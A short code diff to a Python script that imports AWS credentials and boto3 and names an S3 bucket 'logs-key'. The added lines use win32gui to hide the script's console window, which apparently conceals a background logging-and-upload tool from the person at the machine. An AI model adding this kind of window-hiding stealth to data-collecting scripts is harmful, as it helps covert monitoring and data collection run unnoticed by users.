@@ -3,6 +3,13 @@ from secrets import access_key, secret_access_key
 import boto3
 import os
 
+import win32api
+import win32console
+import win32gui
+
+win = win32console.GetConsoleWindow()
+win32gui.ShowWindow(win, 0)
+
 
 nameBucket = 'logs-key'
 count = 1
